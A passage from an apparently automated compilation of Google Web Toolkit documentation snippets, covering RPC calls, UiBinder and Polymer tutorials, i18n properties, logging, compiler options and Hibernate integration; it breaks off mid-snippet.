https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_11\n\nLANGUAGE: apacheconf\nCODE:\n```\n<Proxy \\*>\n     Order deny,allow\n     Allow from all\n   </Proxy>\n```\n\n----------------------------------------\n\nTITLE: Running Ant Build and Hosted Mode in Shell\nDESCRIPTION: Command to build the project and start GWT hosted mode using Ant.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nant build hosted\n```\n\n----------------------------------------\n\nTITLE: JavaScriptObject Interface Implementation Example\nDESCRIPTION: Demonstration of how JavaScriptObject types can implement interfaces in GWT 2.0+, showing both JSO and non-JSO implementations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsOverlay.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\ninterface Person {\n  String getName();\n}\n\n/** The JSO implementation of Person. */\nclass PersonJso extends JavaScriptObject implements Person {\n  protected PersonJso() {}\n\n  public static native PersonJso create(String name) /*-{\n    return {name: name};\n  }-*/;\n\n  public final native String getName() /*-{\n    return this.name;\n  }-*/;\n}\n\n/** Any number of non-JSO types may implement the Person interface. */\nclass PersonImpl implements Person {\n  private final String name;\n\n  public PersonImpl(String name) {\n    this.name = name;\n  }\n\n  public String getName() {\n    return name;\n  }\n}\n\n// Elsewhere\nclass Troll {\n  /** This method doesn't care about whether p is a JSO or not, this makes testing easier. */\n  public void grindBones(Person p) {\n    String name = p.getName();\n    ...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying GWT Development Mode Command-Line Options\nDESCRIPTION: This code snippet shows the command to display available options for GWT Development Mode. It includes various flags for configuring the development server, logging, code generation, and compilation settings.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_4\n\nLANGUAGE: text\nCODE:\n```\n$ java -cp gwt-dev.jar com.google.gwt.dev.DevMode\nMissing required argument 'module[s]'\nGoogle Web Toolkit 2.12.2\nDevMode [-[no]startServer] [-port port-number | \"auto\"] [-logdir directory] [-logLevel (ERROR|WARN|INFO|TRACE|DEBUG|SPAM|ALL)] [-gen dir] [-bindAddress host-name-or-address] [-codeServerPort port-number | \"auto\"] [-[no]superDevMode] [-server servletContainerLauncher[:args]] [-startupUrl url] [-war dir] [-deploy dir] [-extra dir] [-modulePathPrefix ] [-workDir dir] [-XmethodNameDisplayMode (NONE|ONLY_METHOD_NAME|ABBREVIATED|FULL)] [-sourceLevel [auto, 1.8, 9, 10, 11, 17]] [-[no]generateJsInteropExports] [-includeJsInteropExports/excludeJsInteropExports regex] [-[no]incremental] [-style (DETAILED|OBFUSCATED|PRETTY)] [-[no]failOnError] [-setProperty name=value,value...] module[s]\n\nwhere\n  -[no]startServer                                  Starts a servlet container serving the directory specified by the -war flag. (defaults to ON)\n  -port                                             Specifies the TCP port for the embedded web server (defaults to 8888)\n  -logdir                                           Logs to a file in the given directory, as well as graphically\n  -logLevel                                         The level of logging detail: ERROR, WARN, INFO, TRACE, DEBUG, SPAM or ALL (defaults to INFO)\n  -gen                                              Debugging: causes normally-transient generated types to be saved in the specified directory\n  -bindAddress                                      Specifies the bind address for the code server and web server (defaults to 127.0.0.1)\n  -codeServerPort                                   Specifies the TCP port for the code server (defaults to 9997 for classic Dev Mode or 9876 for Super Dev Mode)\n  -[no]superDevMode                                 Runs Super Dev Mode instead of classic Development Mode. (defaults to ON)\n  -server                                           Specify a different embedded web server to run (must implement ServletContainerLauncher)\n  -startupUrl                                       Automatically launches the specified URL\n  -war                                              The directory into which deployable output files will be written (defaults to 'war')\n  -deploy                                           The directory into which deployable but not servable output files will be written (defaults to 'WEB-INF/deploy' under the -war directory/jar, and may be the same as the -extra directory/jar)\n  -extra                                            The directory into which extra files, not intended for deployment, will be written\n  -modulePathPrefix                                 The subdirectory inside the war dir where DevMode will create module directories. (defaults empty for top level)\n  -workDir                                          The compiler's working directory for internal use (must be writeable; defaults to a system temp dir)\n  -XmethodNameDisplayMode                           EXPERIMENTAL: Specifies method display name mode for chrome devtools: NONE, ONLY_METHOD_NAME, ABBREVIATED or FULL (defaults to NONE)\n  -sourceLevel                                      Specifies Java source level (defaults to 1.8)\n  -[no]generateJsInteropExports                     Generate exports for JsInterop purposes. If no -includeJsInteropExport/-excludeJsInteropExport provided, generates all exports. (defaults to OFF)\n  -includeJsInteropExports/excludeJsInteropExports  Include/exclude members and classes while generating JsInterop exports. Flag could be set multiple times to expand the pattern. (The flag has only effect if exporting is enabled via -generateJsInteropExports)\n  -[no]incremental                                  Compiles faster by reusing data from the previous compile. (defaults to ON)\n  -style                                            Script output style: DETAILED, OBFUSCATED or PRETTY (defaults to OBFUSCATED)\n  -[no]failOnError                                  Fail compilation if any input file contains an error. (defaults to OFF)\n  -setProperty                                      Set the values of a property in the form of propertyName=value1[,value2...].\nand\n  module[s]                                         Specifies the name(s) of the module(s) to host\n```\n\n----------------------------------------\n\nTITLE: Defining Default Properties File for GWT i18n\nDESCRIPTION: Default properties file that defines basic string constants for internationalization. Contains key-value pairs for hello world and goodbye world messages.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nConstants.md#2025-04-09_snippet_0\n\nLANGUAGE: properties\nCODE:\n```\nhelloWorld = hello, world\ngoodbyeWorld = goodbye, world\n```\n\n----------------------------------------\n\nTITLE: Caching GWT RPC Service Proxy\nDESCRIPTION: Example demonstrating how to cache the RPC service proxy as a class member for reuse across multiple calls, improving efficiency.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic class Foo implements EntryPoint {\n      private MyEmailServiceAsync myEmailService = (MyEmailServiceAsync) GWT.create(MyEmailService.class);\n\n      public void onModuleLoad() {\n        // ... other initialization\n      }\n\n      /**\n       * Make a GWT-RPC call to the server.  The myEmailService class member\n       * was initialized when the module started up.\n       */\n      void sendEmail (String message) {\n          myEmailService.sendEmail(message, new AsyncCallback<String>() {\n\n            public void onFailure(Throwable caught) {\n              Window.alert(\"RPC to sendEmail() failed.\");\n            }\n\n            public void onSuccess(String result) {\n              label.setText(result);\n            }\n          });\n      }\n    }\n```\n\n----------------------------------------\n\nTITLE: Applying Styles to GWT Elements in Java\nDESCRIPTION: This Java snippet demonstrates how to apply CSS styles to GWT elements using the addStyleName method. It includes styling the stock list header, table, numeric columns, and remove column.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic void onModuleLoad() {\n  // Create table for stock data.\n  stocksFlexTable.setText(0, 0, \"Symbol\");\n  stocksFlexTable.setText(0, 1, \"Price\");\n  stocksFlexTable.setText(0, 2, \"Change\");\n  stocksFlexTable.setText(0, 3, \"Remove\");\n  \n  // Add styles to elements in the stock list table.\n  stocksFlexTable.getRowFormatter().addStyleName(0, \"watchListHeader\");\n  stocksFlexTable.addStyleName(\"watchList\");\n  stocksFlexTable.getCellFormatter().addStyleName(0, 1, \"watchListNumericColumn\");\n  stocksFlexTable.getCellFormatter().addStyleName(0, 2, \"watchListNumericColumn\");\n  stocksFlexTable.getCellFormatter().addStyleName(0, 3, \"watchListRemoveColumn\");\n```\n\n----------------------------------------\n\nTITLE: Importing Icon Collections in GWT Polymer Application\nDESCRIPTION: This updated EntryPoint class adds the iron-icons collection to the imports. The importHref method loads all required web components and ensures they're available before the application starts.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.vaadin.polymer.Polymer;\nimport com.vaadin.polymer.elemental.Function;\n\npublic class TodoList implements EntryPoint {\n\n  public void onModuleLoad() {\n    // We have to load icon sets before run application\n    Polymer.importHref(Arrays.asList(\n          \"iron-icons/iron-icons.html\",\n           PaperIconItemElement.SRC,\n           IronIconElement.SRC), new Function() {\n      public Object call(Object arg) {\n        // The app is executed when all imports succeed.\n        startApplication();\n        return null;\n      }\n    });\n  }\n\n  private void startApplication() {\n    RootPanel.get().add(new Main());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Embedded Data with GWT Dictionary Class\nDESCRIPTION: This alternative approach uses GWT's Dictionary class to access the 'info' JavaScript object embedded in the host page. This provides a more type-safe way to retrieve values from JavaScript objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dynamic_host_page.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic void onModuleLoad() {\n  // Looks for a JS variable called \"info\" in the global scope\n  Dictionary info = Dictionary.getDictionary(\"info\");\n  String email = info.get(\"email\");\n  Window.alert(\"Welcome, \" + email + \"!\");\n}\n```\n\n----------------------------------------\n\nTITLE: Handler Management in GWT Logging\nDESCRIPTION: Example showing how to add and remove logging handlers using checkbox events in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLogging.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic void onValueChange(ValueChangeEvent<Boolean> event) {\n  if (checkbox.getValue()) {\n    logger.addHandler(handler);\n  } else {\n    logger.removeHandler(handler);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Account Entity Constructor with DTO Conversion\nDESCRIPTION: Constructor in Account entity class that creates an Account instance from AccountDTO data.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\npublic Account(AccountDTO accountDTO) {\n  id = accountDTO.getId();\n  name = accountDTO.getName();\n  password = accountDTO.getPassword();\n  Set<RecordDTO> recordDTOs = accountDTO.getRecords();\n  if (recordDTOs != null) {\n    Set<Record> records = new HashSet<Record>(recordDTOs.size());\n    for (RecordDTO recordDTO : recordDTOs) {\n      records.add(new Record(recordDTO));\n    }\n    this.records = records;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Super Dev Mode in GWT 2.6.1 Module XML\nDESCRIPTION: Required XML configuration for enabling Super Dev Mode in GWT 2.6.1. This adds the xsiframe linker which is needed for Super Dev Mode to function.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/superdevmode.md#2025-04-09_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<add-linker name=\"xsiframe\"/>\n```\n\n----------------------------------------\n\nTITLE: Automatically Generating CssResource Interfaces via Command Line\nDESCRIPTION: Shows how to use the InterfaceGenerator utility included in the GWT distribution to analyze a CssResource-compatible CSS file and create a corresponding Java interface for accessing class names.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_39\n\nLANGUAGE: shell\nCODE:\n```\njava -cp gwt-dev.jar:gwt-user.jar com.google.gwt.resources.css.InterfaceGenerator \\\n  -standalone -typeName some.package.MyCssResource -css input.css\n```\n\n----------------------------------------\n\nTITLE: Adding Content Panel to GWT Layout\nDESCRIPTION: Extends the layout by adding a content panel for todo items with vertical centering and justification.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-buildui.md#2025-04-09_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<g:HTMLPanel>\n     ...\n      <div main=\"\">\n          <p:PaperHeaderPanel mode=\"seamed\">\n              <p:PaperToolbar>\n                  <p:PaperIconButton ui:field=\"menu\" icon=\"more-vert\"\n                      attributes=\"paper-drawer-toggle\"/>\n                  <span>Todo List</span>\n              </p:PaperToolbar>\n\n              <g:HTMLPanel ui:field=\"content\"\n                 addStyleNames=\"vertical center-justified layout\" />\n\n          </p:PaperHeaderPanel>\n      </div>\n     ...\n  </g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: Initializing ARIA States in GWT CustomButton\nDESCRIPTION: Shows how to initialize aria-pressed and aria-disabled states when constructing a CustomButton widget. The code sets initial ARIA states using the Roles API.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideA11y.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nprotected CustomButton() {\n    ...\n    // Add a11y state \"aria-pressed\" and \"aria-disabled\"\n    Roles.getButtonRole().setAriaPressedState(getElement(), PressedValue.of(false));\n    Roles.getButtonRole().setAriaDisabledState(getElement(), false);\n  }\n```\n\n----------------------------------------\n\nTITLE: GWT Module XML Configuration Update\nDESCRIPTION: Module configuration update to remove domain package from client-side compilation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_18\n\nLANGUAGE: xml\nCODE:\n```\n<!-- Remove the line below -->\n<source path=\"domain\"/>\n```\n\n----------------------------------------\n\nTITLE: Modifying a Button Label in GWT\nDESCRIPTION: Java code snippet showing how to create a button with modified text in a GWT application. The modified code creates a button with \"Send to Server\" text.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nfinal Button sendButton = new Button(\"Send to Server\");\n```\n\n----------------------------------------\n\nTITLE: Accessing Browser-Specific Implementation in PopupPanel\nDESCRIPTION: Demonstrates how the PopupPanel class delegates to its browser-specific implementation through the impl reference created with GWT.create().\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsDeferred.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic void setVisible(boolean visible) {\n    // ... common code for all implementations of PopupPanel ...\n\n    // If the PopupImpl creates an iframe shim, it's also necessary to hide it\n    // as well.\n    impl.setVisible(getElement(), visible);\n  }\n```\n\n----------------------------------------\n\nTITLE: Declaring UI Fields in Main Java Class\nDESCRIPTION: Java code to declare the UI fields defined in the Main.ui.xml file. These fields provide programmatic access to the UI components in the Main class.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n@UiField PaperDrawerPanel drawerPanel;\n@UiField HTMLPanel content;\n\n@UiField PaperDialog addItemDialog;\n@UiField PaperInput titleInput;\n@UiField PaperTextarea descriptionInput;\n```\n\n----------------------------------------\n\nTITLE: Creating Add Item Dialog with UiBinder XML\nDESCRIPTION: XML markup for creating a modal dialog using Polymer paper elements to add new items. Includes input fields for title and description with validation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-applogic.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<g:HTMLPanel>\n  ...\n  <paper-dialog ui:field=\"addItemDialog\"\n                entry-animation=\"fade-in-animation\"\n                class=\"dialog\" modal=\"\">\n    <h2>Add Item</h2>\n    <paper-input ui:field=\"titleInput\" label=\"Title\" required=\"\"\n                 auto-validate=\"\" error-message=\"required input!\"/>\n    <div class=\"textarea-container iron-autogrow-textarea\">\n        <paper-textarea ui:field=\"descriptionInput\" label=\"Notes\"/>\n    </div>\n    <div class=\"buttons\">\n        <paper-button dialog-dismiss=\"\">Cancel</paper-button>\n        <paper-button ui:field=\"confirmAddButton\"\n                      dialog-confirm=\"\">OK</paper-button>\n    </div>\n  </paper-dialog>\n</g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: Creating UiBinder Main.java Class for TodoList Application in GWT\nDESCRIPTION: This code defines the Main class that extends Composite and uses UiBinder to connect with the UI XML template. It creates the main screen of the TodoList application using GWT's UiBinder pattern.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.client.GWT;\nimport com.google.gwt.uibinder.client.UiBinder;\nimport com.google.gwt.user.client.ui.Composite;\nimport com.google.gwt.user.client.ui.HTMLPanel;\n\npublic class Main extends Composite {\n  interface MainUiBinder extends UiBinder<HTMLPanel, Main> {\n  }\n\n  private static MainUiBinder ourUiBinder = GWT.create(MainUiBinder.class);\n\n  public Main() {\n    initWidget(ourUiBinder.createAndBindUi(this));\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Styling Presentation Details with CSS\nDESCRIPTION: CSS styles for formatting presentation details on the page, including margins, padding, and horizontal dividers.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/presentations.md#2025-04-09_snippet_0\n\nLANGUAGE: CSS\nCODE:\n```\ndiv.preso-detail {\n  margin-bottom: 30px;\n}\n\ndiv.preso-detail blockquote {\n  margin: 20px 2em;\n  padding: 0;\n}\n\nhr.divider {\n  margin: 30px 0;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring MusicStore Service with Gilead BeanManager\nDESCRIPTION: Complete implementation of MusicStoreServiceImpl with Gilead configuration including HibernateUtil and PersistentBeanManager setup.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_28\n\nLANGUAGE: java\nCODE:\n```\nimport net.sf.gilead.core.PersistentBeanManager;\nimport net.sf.gilead.core.hibernate.HibernateUtil;\nimport net.sf.gilead.core.store.stateless.StatelessProxyStore;\nimport net.sf.gilead.gwt.PersistentRemoteService;\n\npublic class MusicStoreServiceImpl extends PersistentRemoteService implements MusicStoreService {\n\n  /**\n   * Constructor\n   */\n  public MusicStoreServiceImpl() {\n    HibernateUtil gileadHibernateUtil = new HibernateUtil();\n    gileadHibernateUtil.setSessionFactory(com.google.musicstore.util.HibernateUtil.getSessionFactory());\n\n    PersistentBeanManager persistentBeanManager = new PersistentBeanManager();\n    persistentBeanManager.setPersistenceUtil(gileadHibernateUtil);\n    persistentBeanManager.setProxyStore(new StatelessProxyStore());\n\n    setBeanManager(persistentBeanManager);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: StringBuilder Class Methods\nDESCRIPTION: StringBuilder class API for mutable string operations including append, insert and delete methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_6\n\nLANGUAGE: Java\nCODE:\n```\nStringBuilder(), StringBuilder(String)\nappend(String), insert(int, String)\ndelete(int, int), reverse()\n```\n\n----------------------------------------\n\nTITLE: Custom Logging Area Implementation\nDESCRIPTION: Demonstrates how to create a custom logging area using VerticalPanel and HasWidgetsLogHandler in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLogging.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nVerticalPanel customLogArea;\n\nlogger.addHandler(new HasWidgetsLogHandler(customLogArea));\n```\n\n----------------------------------------\n\nTITLE: Removing Child Elements in GWT\nDESCRIPTION: This snippet shows how to remove all child elements from a content element in GWT. It uses a while loop to iterate through and remove each child node.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-applogic.md#2025-04-09_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\n// remove all child elements\nwhile (content.hasChildNodes()) {\n  content.removeChild(content.getFirstChild());\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Button Component in GWT Java Client Code\nDESCRIPTION: Example showing how to create a button component in GWT, demonstrating both the initial implementation and a modified version with updated button text.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/usingeclipse.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nfinal Button sendButton = new Button(\"Send\");\n```\n\nLANGUAGE: java\nCODE:\n```\nfinal Button sendButton = new Button(\"Send to Server\");\n```\n\n----------------------------------------\n\nTITLE: Static Argument Message Example (Java)\nDESCRIPTION: Shows how to use static arguments to include HTML markup in messages\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\n@DefaultMessage(\"Welcome back, {startBold,<b>}{0}{endBold,</b>}\")\n```\n\n----------------------------------------\n\nTITLE: Enabling Compilation Reports in GWT Compiler\nDESCRIPTION: Shows the compiler flags used to generate Compilation Reports during GWT compilation. The -compileReport flag produces a standard report, while -XsoycDetailed includes additional details on Java to JavaScript mappings.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompileReport.md#2025-04-09_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n-compileReport\n-XsoycDetailed\n```\n\n----------------------------------------\n\nTITLE: UiHandler Event Handling in ContactsView\nDESCRIPTION: Implementation of event handlers in the View that use the @UiHandler annotation to link UI events with methods, which then delegate to the appropriate Presenter methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsViewImpl<T> extends Composite implements ContactsView<T> {\n  ...\n  @UiHandler(\"addButton\")\n  void onAddButtonClicked(ClickEvent event) {\n    if (presenter != null) {\n      presenter.onAddButtonClicked();\n    }\n  }\n\n  @UiHandler(\"deleteButton\")\n  void onDeleteButtonClicked(ClickEvent event) {\n    if (presenter != null) {\n      presenter.onDeleteButtonClicked();\n    }\n  }\n\n  @UiHandler(\"contactsTable\")\n  void onTableClicked(ClickEvent event) {\n    if (presenter != null) {\n      HTMLTable.Cell cell = contactsTable.getCellForEvent(event);\n\n      if (cell != null) {\n        if (shouldFireClickEvent(cell)) {\n          presenter.onItemClicked(rowData.get(cell.getRowIndex()));\n        }\n\n        if (shouldFireSelectEvent(cell)) {\n          presenter.onItemSelected(rowData.get(cell.getRowIndex()));\n\n        }\n      }\n    }\n  }\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Generated Properties for HTMLPanel with Widgets\nDESCRIPTION: The properties file generated for the HTMLPanel containing widgets, showing how the widgets are treated as placeholders.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_12\n\nLANGUAGE: properties\nCODE:\n```\n# 0=arg0 (Example: <span>), 1=arg1 (Example: </span>), 2=arg2 (Example: <span>), 3=arg3 (Example: </span>)\n23CBEA252C9901BF84D757FAD4968289=Meeting starts at {0}{1} and ends at {2}{3}.\n\n```\n\n----------------------------------------\n\nTITLE: Initializing Constants in GSS Conditional Blocks\nDESCRIPTION: Shows how to define constants with different values based on browser detection in GSS, allowing for browser-specific styling constants.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_6\n\nLANGUAGE: css\nCODE:\n```\n@if (is(\"ie8\") || is(\"ie9\")) {\n  @def PADDING 15px;\n}@else {\n  @def PADDING 0;\n}\n```\n\n----------------------------------------\n\nTITLE: Setting ID for Static HTML Element in GWT Host Page\nDESCRIPTION: Shows how to set an ID for a static HTML element in the GWT host page for CSS targeting.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCss.md#2025-04-09_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"my-button-id\"/>\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Host Page for GWT Application\nDESCRIPTION: This HTML snippet shows the structure of the host page for a GWT application. It includes a link to the application's CSS file and a script tag to load the GWT-generated JavaScript.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n    <link type=\"text/css\" rel=\"stylesheet\" href=\"StockWatcher.css\">\n    <title>StockWatcher</title>\n    <script src=\"stockwatcher/stockwatcher.nocache.js\"></script>\n  </head>\n  <body>\n    <h1>StockWatcher</h1>\n    <div id=\"stockList\"></div>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Creating a Working Module for Development in XML\nDESCRIPTION: Example of a GWT module XML file that creates a 'working module' to speed up development by restricting permutations. It inherits from another module and sets specific properties for user agent and locale.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_4\n\nLANGUAGE: XML\nCODE:\n```\n<module rename-to=\"com.foo.MyModule\">\n  <inherits name=\"com.foo.MyModule\" />\n  <set-property name=\"user.agent\" value=\"ie6\" />\n  <set-property name=\"locale\" value=\"default\" />\n</module>\n```\n\n----------------------------------------\n\nTITLE: Configuring GWT Maven Plugin for JsInterop\nDESCRIPTION: Maven plugin configuration to enable experimental JsInterop feature in GWT\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/create.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<plugin>\n  <groupId>org.codehaus.mojo</groupId>\n  <artifactId>gwt-maven-plugin</artifactId>\n  ...\n  <configuration>\n    <jsInteropMode>JS</jsInteropMode>\n    ...\n  </configuration>\n</plugin>\n```\n\n----------------------------------------\n\nTITLE: Implementing the Global Collector Function in HTML\nDESCRIPTION: Implementation of the __gwtStatsEvent() global collector function in the host HTML page. This function captures metrics events, handles buffering before DOM is ready, and logs events to a DIV element.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLightweightMetrics.md#2025-04-09_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<head>\n  <title>Hello</title>\n\n  <script language='javascript'>\n    function eventToString(event) {\n      // return some string representation of this event\n      return event.evtGroup + \" | \" + event.moduleName + \" | \" + event.subSystem + \" | \" + event.type + \" | \" + event.millis;\n    }\n\n    window.__gwtStatsEvent = function(event) {\n      var loggingDiv = document.getElementById('log');\n      if (!loggingDiv) {\n        // Our logging div is not yet attached to the DOM\n        // Initialize a temporary buffer if needed\n        this.buffer = (this.buffer) ? this.buffer : [];\n        // log data here\n        this.buffer.push(event);\n      } else {\n        if (this.buffer) {\n        // We have some data that was reported before the div was connected\n          for (var i = 0; i < buffer.length; i++) {\n            // print it all to the div\n            var bufferedEvent = buffer[i];\n            var logline = document.createElement(\"div\");\n            logline.id = \"logline\";\n            logline.innerHTML = eventToString(bufferedEvent);\n            loggingDiv.appendChild(logline);\n          }\n          this.buffer = null;\n        }\n        // log the current event to the div\n        var logline = document.createElement(\"div\");\n        logline.id = \"logline\";\n        logline.innerHTML = eventToString(event);\n        loggingDiv.appendChild(logline);\n      }\n      // The collector function should indicate success\n      return true;\n    }\n  </script>\n</head>\n<body>\n  <div id=\"log\"><h3>Statistics for Events Logged</h3></div>\n  <script type=\"text/javascript\" language=\"javascript\" src=\"hello/hello.nocache.js\"></script>\n  <iframe src=\"javascript:''\" id=\"__gwt_historyFrame\" style=\"position:absolute;width:0;height:0;border:0\"></iframe>\n</body>\n```\n\n----------------------------------------\n\nTITLE: Generated Properties with ui:ph Protection\nDESCRIPTION: The properties file generated when using ui:ph elements, showing how spans are now treated as single placeholder arguments.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_9\n\nLANGUAGE: properties\nCODE:\n```\n# 0=arg0 (Example: 7/12/2008), 1=arg1 (Example: 7/12/2008)\n53B9CF65553DFAA091435791E5C731E7=(closed {0} through {1})\n\n```\n\n----------------------------------------\n\nTITLE: Original HTMLPanel with Text-containing Widget\nDESCRIPTION: HTMLPanel containing a Hyperlink widget with text that needs to be part of the translation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_13\n\nLANGUAGE: xml\nCODE:\n```\n<g:HTMLPanel>\n  To do the thing, <g:Hyperlink targetHistoryToken=\"/doThe#thing\">click here</g:Hyperlink>\n  and massage vigorously.\n</g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: Generated Properties with meaning Attribute\nDESCRIPTION: The properties file generated when using the meaning attribute, showing how the same word can have different hash IDs based on its meaning.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_20\n\nLANGUAGE: properties\nCODE:\n```\n# Meaning: the color\n4404BE8C34552617D633271BBC1FAB07=Orange\n\n# Meaning: the fruit\n7A6DCA1ACC86B4A7D7574CD6BDD4E0C1=Orange\n\n9F6290F4436E5A2351F12E03B6433C3C=Apple\n\nEE38E4D5DD68C4E440825018D549CB47=Red\n\n```\n\n----------------------------------------\n\nTITLE: Contact View Column Definitions Implementation in GWT\nDESCRIPTION: Implementation of column definitions for a contacts view, showing checkbox and HTML rendering.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\npublic class 